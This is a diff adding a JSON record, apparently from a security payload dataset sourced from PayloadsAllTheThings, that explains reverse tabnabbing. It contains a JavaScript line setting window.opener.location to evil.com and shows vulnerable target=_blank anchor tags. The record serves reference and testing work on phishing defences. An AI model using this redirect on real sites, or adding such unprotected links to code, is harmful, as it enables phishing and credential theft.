@@ -1,0 +1,18 @@
+{
+  "id": "tabnabbing-782a4d682b90",
+  "category": "TABNABBING",
+  "title": "README",
+  "description": "# Tabnabbing\n\n> Reverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page, for example to replace it with a phishing site. As the user was originally on the correct page they are less likely to notice that it has been changed to a phishing site, especially if the site looks the same as the target. If the user authenticates to this new page then their credentials (or other sensitive data) are sent to the phishing site rather than the legitimate one.\n\n##",
+  "payloads": [
+    "* [PortSwigger/discovering-reversetabnabbing](https://portswigger.net/bappstore/80eb8fd46bf847b4b17861482c2f2a30) - Discovering Reverse Tabnabbing",
+    "1. Attacker posts a link to a website under his control that contains the following JS code: `window.opener.location = \"http://evil.com\"`",
+    "<a href=\"...\" target=\"_blank\" rel=\"\">",
+    "<a href=\"...\" target=\"_blank\">",
+    "* [Reverse Tabnabbing - OWASP - October 20, 2020](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)",
+    "* [Tabnabbing - Wikipedia - May 25, 2010](https://en.wikipedia.org/wiki/Tabnabbing)"
+  ],
+  "references": [
+    "PayloadsAllTheThings/Tabnabbing/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
